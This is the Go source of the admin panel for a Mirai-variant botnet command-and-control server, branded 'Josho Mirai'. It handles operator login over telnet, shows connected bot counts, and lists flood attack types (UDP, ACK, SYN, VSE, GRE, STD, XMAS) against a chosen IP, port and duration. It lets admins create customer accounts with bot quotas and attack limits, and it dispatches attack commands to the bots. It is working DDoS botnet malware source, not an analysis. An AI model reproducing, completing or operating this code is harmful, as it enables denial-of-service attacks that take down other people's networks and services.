package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()

    // Get username
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[90mUsername\033[33;3m: \033[0m"))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    // Get password
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[90mPassword\033[33;3m: \033[0m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))

    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
	    this.conn.Write([]byte("\033[2J\033[1;1H"))
        this.conn.Write([]byte("\r\033[91m[!] INVALAD INFORMATION\r\n"))
        this.conn.Write([]byte("\033[91mpress any key to exit\033[0m"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }

    this.conn.Write([]byte("\r\n\033[0m"))
    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }

            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;%d Bots Connected | %s\007", BotCount, username))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()

	this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.Write([]byte("\t   \x1b[0;34m .d8b. \x1b[0;37m d8888b.\x1b[0;34m  .d88b. \x1b[0;37m db     \x1b[0;34m db      \x1b[0;37m  .d88b.  \r\n"))
	this.conn.Write([]byte("\t   \x1b[0;34md8' `8b\x1b[0;37m 88  `8D\x1b[0;34m .8P  Y8.\x1b[0;37m 88     \x1b[0;34m 88      \x1b[0;37m .8P  Y8. \r\n"))
	this.conn.Write([]byte("\t   \x1b[0;34m88ooo88\x1b[0;37m 88oodD'\x1b[0;34m 88    88\x1b[0;37m 88     \x1b[0;34m 88      \x1b[0;37m 88    88 \r\n"))
	this.conn.Write([]byte("\t   \x1b[0;34m88~~~88\x1b[0;37m 88~~~  \x1b[0;34m 88    88\x1b[0;37m 88     \x1b[0;34m 88      \x1b[0;37m 88    88 \r\n"))
	this.conn.Write([]byte("\t   \x1b[0;34m88   88\x1b[0;37m 88     \x1b[0;34m `8b  d8'\x1b[0;37m 88booo.\x1b[0;34m 88booo. \x1b[0;37m `8b  d8' \r\n"))
	this.conn.Write([]byte("\t   \x1b[0;34mYP   YP\x1b[0;37m 88     \x1b[0;34m  `Y88P' \x1b[0;37m Y88888P\x1b[0;34m Y88888P \x1b[0;37m  `Y88P'  \r\n"))
	this.conn.Write([]byte("\033[1;36m                     \033[1;35m[\033[1;32m+\033[1;35m]\033[0;36mWelcome " + username + " \033[1;35m[\033[1;32m+\033[1;35m]\r\n\033[0m"))
	this.conn.Write([]byte("\033[1;36m                   \033[1;35m[\033[1;32m+\033[1;35m]\033[1;31mType help to Get Help\033[1;35m[\033[1;32m+\033[1;35m]\r\n\033[0m"))
	
    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\033[94m[\033[31m" + username + "\033[94m@\033[31mApollo ~\033[94m]\033[31m# \033[0m"))
        cmd, err := this.ReadLine(false)
        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }
        if cmd == "" {
            continue
        }
		if err != nil || cmd == "clear" || cmd == "CLEAR" || cmd == "cls" || cmd == "CLS" {
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\t   \x1b[0;34m .d8b. \x1b[0;37m d8888b.\x1b[0;34m  .d88b. \x1b[0;37m db     \x1b[0;34m db      \x1b[0;37m  .d88b.  \r\n"))
			this.conn.Write([]byte("\t   \x1b[0;34md8' `8b\x1b[0;37m 88  `8D\x1b[0;34m .8P  Y8.\x1b[0;37m 88     \x1b[0;34m 88      \x1b[0;37m .8P  Y8. \r\n"))
			this.conn.Write([]byte("\t   \x1b[0;34m88ooo88\x1b[0;37m 88oodD'\x1b[0;34m 88    88\x1b[0;37m 88     \x1b[0;34m 88      \x1b[0;37m 88    88 \r\n"))
			this.conn.Write([]byte("\t   \x1b[0;34m88~~~88\x1b[0;37m 88~~~  \x1b[0;34m 88    88\x1b[0;37m 88     \x1b[0;34m 88      \x1b[0;37m 88    88 \r\n"))
			this.conn.Write([]byte("\t   \x1b[0;34m88   88\x1b[0;37m 88     \x1b[0;34m `8b  d8'\x1b[0;37m 88booo.\x1b[0;34m 88booo. \x1b[0;37m `8b  d8' \r\n"))
			this.conn.Write([]byte("\t   \x1b[0;34mYP   YP\x1b[0;37m 88     \x1b[0;34m  `Y88P' \x1b[0;37m Y88888P\x1b[0;34m Y88888P \x1b[0;37m  `Y88P'  \r\n"))
			this.conn.Write([]byte("\033[1;36m                     \033[1;35m[\033[1;32m+\033[1;35m]\033[0;36mWelcome " + username + " \033[1;35m[\033[1;32m+\033[1;35m]\r\n\033[0m"))
			this.conn.Write([]byte("\033[1;36m                   \033[1;35m[\033[1;32m+\033[1;35m]\033[1;31mType help to Get Help\033[1;35m[\033[1;32m+\033[1;35m]\r\n\033[0m"))
	        continue
		}
		if err != nil || cmd == "batkek" || cmd == "BATKEK" || cmd == "clear_batkek" || cmd == "CLEAR_BATKEK" {
			this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("                \033[91m██████\033[93m╗  \033[91m█████\033[93m╗ \033[91m████████\033[93m╗\033[91m██\033[93m╗  \033[91m██\033[93m╗\033[91m███████\033[93m╗\033[91m██\033[93m╗  \033[91m██\033[93m╗\r\n"))
            this.conn.Write([]byte("                \033[91m██\033[93m╔══\033[91m██\033[93m╗\033[91m██\033[93m╔══\033[91m██\033[93m╗╚══\033[91m██\033[93m╔══╝\033[91m██\033[93m║ \033[91m██\033[93m╔╝\033[91m██\033[93m╔════╝\033[91m██\033[93m║ \033[91m██\033[93m╔╝\r\n"))
            this.conn.Write([]byte("                \033[91m██████\033[93m╔╝\033[91m███████\033[93m║   \033[91m██\033[93m║   \033[91m█████\033[93m╔╝ \033[91m█████\033[93m╗  \033[91m█████\033[93m╔╝\r\n"))
            this.conn.Write([]byte("                \033[91m██\033[93m╔══\033[91m██\033[93m╗\033[91m██\033[93m╔══\033[91m██\033[93m║   \033[91m██\033[93m║   \033[91m██\033[93m╔═\033[91m██\033[93m╗ \033[91m██\033[93m╔══╝  \033[91m██\033[93m╔═\033[91m██\033[93m╗\r\n"))
            this.conn.Write([]byte("                \033[91m██████\033[93m╔╝\033[91m██\033[93m║  \033[91m██\033[93m║   \033[91m██\033[93m║   \033[91m██\033[93m║  \033[91m██\033[93m╗\033[91m███████\033[93m╗\033[91m██\033[93m║  \033[91m██\033[93m╗\r\n"))
            this.conn.Write([]byte("                \033[93m╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝\r\n"))
            this.conn.Write([]byte("\033[1;36m                     \033[1;35m[\033[1;32m+\033[1;35m]\033[0;36mWelcome " + username + " \033[1;35m[\033[1;32m+\033[1;35m]\r\n\033[0m"))
	        this.conn.Write([]byte("\033[1;36m                   \033[1;35m[\033[1;32m+\033[1;35m]\033[1;31mType help to Get Help\033[1;35m[\033[1;32m+\033[1;35m]\r\n\033[0m"))
	        continue
		}
		if err != nil || cmd == "josho" || cmd == "JOSHO" || cmd == "clear_josho" || cmd == "CLEAR_JOSHO" {
			this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\r\t         \033[31m██\033[0m╗ \033[31m██████\033[0m╗ \033[31m███████\033[0m╗\033[31m██\033[0m╗  \033[31m██\033[0m╗ \033[31m██████\033[0m╗ \r\n"))
            this.conn.Write([]byte("\r\t         \033[31m██\033[0m║\033[31m██\033[0m╔═══\033[31m██\033[0m╗\033[31m██\033[0m╔════╝\033[31m██\033[0m║  \033[31m██\033[0m║\033[31m██\033[0m╔═══\033[31m██\033[0m╗\r\n"))
            this.conn.Write([]byte("\r\t         \033[31m██\033[0m║\033[31m██\033[0m║   \033[31m██\033[0m║\033[31m███████\033[0m╗\033[31m███████\033[0m║\033[31m██\033[0m║   \033[31m██\033[0m║\r\n"))
            this.conn.Write([]byte("\r\t    \033[31m██   \033[31m██\033[0m║\033[31m██\033[0m║   \033[31m██\033[0m║╚════\033[31m██\033[0m║\033[31m██\033[0m╔══\033[31m██\033[0m║\033[31m██\033[0m║   \033[31m██\033[0m║\r\n"))
            this.conn.Write([]byte("\r\t    \033[0m╚\033[31m█████\033[0m╔╝╚\033[31m██████\033[0m╔╝\033[31m███████\033[0m║\033[31m██\033[0m║  \033[31m██\033[0m║╚\033[31m██████\033[0m╔╝\r\n"))
            this.conn.Write([]byte("\r\t     \033[0m╚════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝ \r\n"))
            this.conn.Write([]byte("\033[1;36m                     \033[1;35m[\033[1;32m+\033[1;35m]\033[0;36mWelcome " + username + " \033[1;35m[\033[1;32m+\033[1;35m]\r\n\033[0m"))
	        this.conn.Write([]byte("\033[1;36m                   \033[1;35m[\033[1;32m+\033[1;35m]\033[1;31mType help to Get Help\033[1;35m[\033[1;32m+\033[1;35m]\r\n\033[0m"))
	        continue
		}
		if err != nil || cmd == "SAO" || cmd == "sao" || cmd == "CLEAR_SAO" || cmd == "clear_sao" {
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\t\033[37m       .---.    \t                            \t\033[37m       .---.    \r\n"))
			this.conn.Write([]byte("\t\033[37m       |---|    \t                            \t\033[37m       |---|    \r\n"))
			this.conn.Write([]byte("\t\033[37m       |---|    \t                            \t\033[37m       |---|    \r\n"))
			this.conn.Write([]byte("\t\033[37m       |---|    \t                            \t\033[37m       |---|    \r\n"))
			this.conn.Write([]byte("\t\033[37m   .---^ - ^---.\t                            \t\033[37m   .---^ - ^---.\r\n"))
			this.conn.Write([]byte("\t\033[37m   :___________:\t                            \t\033[37m   :___________:\r\n"))
			this.conn.Write([]byte("\t\033[37m      |  |//|   \t\033[36m  ██████  ▄▄▄       \033[31m▒\033[36m█████  \t\033[37m      |  |//|   \r\n"))
			this.conn.Write([]byte("\t\033[37m      |  |//|   \t\033[31m▒\033[36m██    \033[31m▒ ▒\033[36m████▄    \033[31m▒\033[36m██\033[31m▒  \033[36m██\033[31m▒\t\033[37m      |  |//|   \r\n"))
			this.conn.Write([]byte("\t\033[37m      |  |//|   \t\033[31m░ ▓\033[36m██▄  \033[31m ▒\033[36m██  ▀█▄  \033[31m▒\033[36m██\033[31m░  \033[36m██\033[31m▒\t\033[37m      |  |//|   \r\n"))
			this.conn.Write([]byte("\t\033[37m      |  |//|   \t\033[31m  ▒\033[36m   ██\033[31m▒░\033[36m██▄▄▄▄██ \033[31m▒\033[36m██   ██\033[31m░\t\033[37m      |  |//|   \r\n"))
			this.conn.Write([]byte("\t\033[37m      |  |//|   \t\033[31m▒\033[36m██████\033[31m▒▒ ▓\033[36m█   \033[31m▓\033[36m██\033[31m▒░ \033[36m████\033[31m▓▒░\t\033[37m      |  |//|   \r\n"))
			this.conn.Write([]byte("\t\033[37m      |  |//|   \t\033[31m▒ ▒▓▒ ▒ ░ ▒▒   ▓▒\033[36m█\033[31m░░ ▒░▒░▒░ \t\033[37m      |  |//|   \r\n"))
        	this.conn.Write([]byte("\t\033[37m      |  |.-|   \t\033[31m░ ░▒  ░ ░  ▒   ▒▒ ░  ░ ▒ ▒░ \t\033[37m      |  |.-|   \r\n"))
         	this.conn.Write([]byte("\t\033[37m      |.-'**|   \t\033[31m░  ░  ░    ░   ▒   ░ ░ ░ ▒  \t\033[37m      |.-'**|   \r\n"))
	        this.conn.Write([]byte("\t\033[37m       \\***/    \t\033[31m      ░        ░  ░    ░ ░  \t\033[37m       \\***/    \r\n"))
	        this.conn.Write([]byte("\t\033[37m        \\*/     \t                            \t\033[37m        \\*/     \r\n"))
	        this.conn.Write([]byte("\t\033[37m         V      \t                            \t\033[37m         V      \r\n"))
	        this.conn.Write([]byte("\t\033[37m        '       \t                            \t\033[37m        '       \r\n"))
	        this.conn.Write([]byte("\t\033[37m         ^'     \t                            \t\033[37m         ^'     \r\n"))
	        this.conn.Write([]byte("\t\033[37m        (_)     \t                            \t\033[37m        (_)     \r\n"))
            this.conn.Write([]byte("\033[1;36m                     \033[1;35m[\033[1;32m+\033[1;35m]\033[0;36mWelcome " + username + " \033[1;35m[\033[1;32m+\033[1;35m]\r\n\033[0m"))
	        this.conn.Write([]byte("\033[1;36m                   \033[1;35m[\033[1;32m+\033[1;35m]\033[1;31mType help to Get Help\033[1;35m[\033[1;32m+\033[1;35m]\r\n\033[0m"))
			continue
		}
		if err != nil || cmd == "senpai" || cmd == "SENPAI" || cmd == "sen" || cmd == "SEN" || cmd == "clear_senpai" || cmd == "CLEAR_SENPAI" {
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\033[1;35m\t███████\033[1;36m╗\033[1;35m███████\033[1;36m╗\033[1;35m███\033[1;36m╗   \033[1;35m██\033[1;36m╗\033[1;35m██████\033[1;36m╗  \033[1;35m█████\033[1;36m╗ \033[1;35m██\033[1;36m╗\r\n\033[0m"))
			this.conn.Write([]byte("\033[1;35m\t██\033[1;36m╔════╝\033[1;35m██\033[1;36m╔════╝\033[1;35m████\033[1;36m╗  \033[1;35m██\033[1;36m║\033[1;35m██\033[1;36m╔══\033[1;35m██\033[1;36m╗\033[1;35m██\033[1;36m╔══\033[1;35m██\033[1;36m╗\033[1;35m██\033[1;36m║\r\n\033[0m"))
			this.conn.Write([]byte("\033[1;35m\t███████\033[1;36m╗\033[1;35m█████\033[1;36m╗  \033[1;35m██\033[1;36m╔\033[1;35m██\033[1;36m╗ \033[1;35m██\033[1;36m║\033[1;35m██████\033[1;36m╔╝\033[1;35m███████\033[1;36m║\033[1;35m██\033[1;36m║\r\n\033[0m"))
			this.conn.Write([]byte("\033[1;36m\t╚════\033[1;35m██\033[1;36m║\033[1;35m██\033[1;36m╔══╝  \033[1;35m██\033[1;36m║╚\033[1;35m██\033[1;36m╗\033[1;35m██\033[1;36m║\033[1;35m██\033[1;36m╔═══╝ \033[1;35m██\033[1;36m╔══\033[1;35m██\033[1;36m║\033[1;35m██\033[1;36m║\r\n\033[0m"))
			this.conn.Write([]byte("\033[1;35m\t███████\033[1;36m║\033[1;35m███████\033[1;36m╗\033[1;35m██\033[1;36m║ ╚\033[1;35m████\033[1;36m║\033[1;35m██\033[1;36m║     \033[1;35m██\033[1;36m║  \033[1;35m██\033[1;36m║\033[1;35m██\033[1;36m║\r\n\033[0m"))
			this.conn.Write([]byte("\033[1;36m\t╚══════╝╚══════╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝╚═╝\r\n\033[0m"))
			this.conn.Write([]byte("\033[1;36m                     \033[1;35m[\033[1;32m+\033[1;35m]\033[0;36mWelcome " + username + " \033[1;35m[\033[1;32m+\033[1;35m]\r\n\033[0m"))
			this.conn.Write([]byte("\033[1;36m                   \033[1;35m[\033[1;32m+\033[1;35m]\033[1;31mType help to Get Help\033[1;35m[\033[1;32m+\033[1;35m]\r\n\033[0m"))
			continue
		}
        if err != nil || cmd == "HELP" || cmd == "help" || cmd == "?" {
            this.conn.Write([]byte("\033[37m[+]---------------------------------------------------------[+]\r\n"))
            this.conn.Write([]byte("\033[37m |\033[1;37m               Help Menu For Josho Mirai                  \033[37m|\r\n"))
            this.conn.Write([]byte("\033[37m |\033[91m attack \033[96m[\033[90mShow The Attack Menu\033[96m]                            \033[37m|\r\n"))
            this.conn.Write([]byte("\033[37m |\033[91m banners \033[96m[\033[90mShow All Usable Banners\033[96m]                         \033[37m|\r\n"))
            this.conn.Write([]byte("\033[37m |\033[91m logout \033[96m[\033[90mExit Mirai\033[96m]                                      \033[37m|\r\n"))
            this.conn.Write([]byte("\033[37m[+]---------------------------------------------------------[+]\r\n"))
            continue
        }
        if err != nil || cmd == "ATK" || cmd == "atk" || cmd == "attack" || cmd == "ATTACK" {
            this.conn.Write([]byte("\033[37m[+]---------------------------------------------------------[+]\r\n"))
            this.conn.Write([]byte("\033[37m |\033[1;37m             Attack Menu For Josho Mirai                   \033[37m|\r\n"))
            this.conn.Write([]byte("\033[37m |\033[91m udp [ip] [time] dport=[port]              \033[96m| \033[90mudp           \033[37m|\r\n"))
            this.conn.Write([]byte("\033[37m |\033[91m ack [ip] [time] dport=[port]              \033[96m| \033[90mack           \033[37m|\r\n"))
            this.conn.Write([]byte("\033[37m |\033[91m syn [ip] [time] dport=[port]              \033[96m| \033[90msyn           \033[37m|\r\n"))
            this.conn.Write([]byte("\033[37m |\033[91m vse [ip] [time] dport=[port]              \033[96m| \033[90mvse           \033[37m|\r\n"))
            this.conn.Write([]byte("\033[37m |\033[91m greeth [ip] [time] dport=[port]           \033[96m| \033[90mgreeth        \033[37m|\r\n"))
            this.conn.Write([]byte("\033[37m |\033[91m greip [ip] [time] dport=[port]            \033[96m| \033[90mgreip         \033[37m|\r\n"))
            this.conn.Write([]byte("\033[37m |\033[91m std    [ip] [time] dport=[port]           \033[96m| \033[90mstd           \033[37m|\r\n"))
            this.conn.Write([]byte("\033[37m |\033[91m xmas   [ip] [time] dport=[port]           \033[96m| \033[90mxmas          \033[37m|\r\n"))
            this.conn.Write([]byte("\033[37m |\033[91m cls or clear                              \033[96m| \033[90mclears screen \033[37m|\r\n"))
			this.conn.Write([]byte("\033[37m |\033[91m botcount or bots                          \033[96m| \033[90mshows bots    \033[37m|\r\n"))
            this.conn.Write([]byte("\033[37m[+]---------------------------------------------------------[+]\r\n"))
            continue
        }
        if err != nil || cmd == "banners" || cmd == "BANNERS" || cmd == "ban" || cmd == "BAN" {
            this.conn.Write([]byte("\033[37m[+]---------------------------------------------------------[+]\r\n"))
            this.conn.Write([]byte("\033[37m |\033[1;37m               All Available Banners                       \033[37m|\r\n"))
            this.conn.Write([]byte("\033[37m |\033[91m senpai \033[96m[\033[90msenpais banner\033[96m]                                   \033[37m|\r\n"))
            this.conn.Write([]byte("\033[37m |\033[91m sao \033[96m[\033[90mDaddyL33T's banner\033[96m]                                  \033[37m|\r\n"))
			this.conn.Write([]byte("\033[37m |\033[91m josho \033[96m[\033[90mDaddyL33T's banner\033[96m]                                \033[37m|\r\n"))
			this.conn.Write([]byte("\033[37m |\033[91m batkek \033[96m[\033[90mVamps's banner\033[96m]                                   \033[37m|\r\n"))
            this.conn.Write([]byte("\033[37m |\033[91m clear \033[96m[\033[90mrealtek's banner\033[96m]                                  \033[37m|\r\n"))
            this.conn.Write([]byte("\033[37m[+]---------------------------------------------------------[+]\r\n"))
            continue
        }
        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "adduser" {
            this.conn.Write([]byte("Enter new username: "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("Enter new password: "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("Enter wanted bot count (-1 for full net): "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("Max attack duration (-1 for none): "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("Cooldown time (0 for none): "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("New account info: \r\nUsername: " + new_un + "\r\nPassword: " + new_pw + "\r\nBots: " + max_bots_str + "\r\nContinue? (y/N)"))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[32;1mUser added successfully.\033[0m\r\n"))
            }
            continue
        }
        if cmd == "botcount" || cmd == "bots" || cmd == "count" {
		botCount = clientList.Count()
            m := clientList.Distribution()
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s \033[95m[\033[96m%d\033[95m]\r\n\033[0m", k, v)))
            }
			this.conn.Write([]byte(fmt.Sprintf("\033[91mTOTAL \033[35m[\033[36m%d\033[35m]\r\n\033[0m", botCount)))
            continue
        }
        if cmd[0] == '*' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mFailed to parse botcount \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mBot count to send is bigger then allowed bot maximum\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if cmd[0] == '-' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                } else {
                    fmt.Println("Blocked attack by " + username + " to whitelisted prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
